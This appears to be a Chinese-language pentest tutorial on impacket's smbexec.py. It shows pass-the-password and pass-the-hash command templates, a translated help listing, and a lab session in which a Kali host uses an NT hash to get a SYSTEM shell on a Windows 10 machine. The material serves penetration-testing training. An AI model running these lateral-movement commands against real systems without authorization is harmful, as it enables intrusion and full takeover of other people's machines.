
# impacket-smbexec
<div style="text-align: right;">

date: "2023-12-10"

</div>

## 工具特点

smbexe为全交互式工具，所以不可用于webshell环境，可用于rdp等有交互环境登录使用或socks代理环境下使用。

## 基础使用

域环境下传递密码

```shell
python3 smbexec.py <domain>/<username>:<password>@<ip>
```

本地环境下传递密码

```shell
python3 smbexec.py ./<username>:<password>@<ip>
```

域环境下传递Hash

```shell
python3 smbexec.py -hashes :<hash> <domain>/<username>@<ip>
```

本地环境下传递Hash

```shell
python3 smbexec.py -hashes :<hash> ./<username>@<ip>
```

## 参数说明

```shell
# python3 smbexec.py -h
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

usage: smbexec.py [-h] [-share SHARE] [-mode {SHARE,SERVER}] [-ts] [-debug] [-codec CODEC]
                  [-shell-type {cmd,powershell}] [-dc-ip ip address] [-target-ip ip address]
                  [-port [destination port]] [-service-name service_name]
                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB]
                  target

位置参数:
  target                [[域/]用户名[:密码]@]<目标名称或地址>

可选参数:
  -h, --help            显示此帮助消息并退出
  -share SHARE          共享将从哪里获取输出（默认 C$）
  -mode {SHARE,SERVER}  使用模式（默认SHARE，SERVER需要root！）
  -ts                   为每个日志输出添加时间戳
  -debug                 打开 DEBUG 输出
  -codec CODEC          设置目标输出中使用的编码（编解码器）（默认“utf-8”）。 如果检测到错误，请在目标上运行 chcp.com，将结果映射到 https://docs.python.org/3/library/codecs.html#standard-encodings，然后使用 -codec 和 -codec 再次执行 smbexec.py 相应的编解码器
  -shell-type {cmd,powershell}
                        为半交互式 shell 选择命令处理器

连接:
  -dc-ip ip address     域控制器的 IP 地址。 如果省略，它将使用目标参数中指定的域部分 (FQDN)
  -target-ip ip address
                        目标机器的IP地址。 如果省略，它将使用指定为目标的任何内容。 当目标是 NetBIOS 名称并且您无法解析它时，这很有用
  -port [destination port]
                        连接 SMB 服务器的目标端口
  -service-name service_name
                        用于触发有效负载的服务的名称

认证:
  -hashes LMHASH:NTHASH
                        NTLM 哈希值，格式为 LMHASH:NTHASH
  -no-pass              不询问密码（对于 -k 很有用）
  -k                    使用 Kerberos 身份验证。 根据目标参数从 ccache 文件 (KRB5CCNAME) 获取凭据。 如果找不到有效的凭据，它将使用命令行中指定的凭据
  -aesKey hex key       用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）
  -keytab KEYTAB        从 keytab 文件中读取 SPN 的密钥
```

## 实验环境

> 在其它机器上收集到Win10机器的Hash密码进行横向传递

| 机器 | IP | 状态 |
| --- | --- | --- |
| Win10 | 192.168.36.130 | 知道本地管理员用户的Hash值 |
| Kali | 192.168.36.128 |  |

全交互会话

```shell
┌──(kali㉿kali)-[~/Desktop/impacket/examples]
└─$ python3 smbexec.py -hashes :579da618cfbfa85247acf1f800a280a4 administrator@192.168.36.130
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>chcp 65001
Active code page: 65001

C:\Windows\system32>whoami
nt authority\system

```
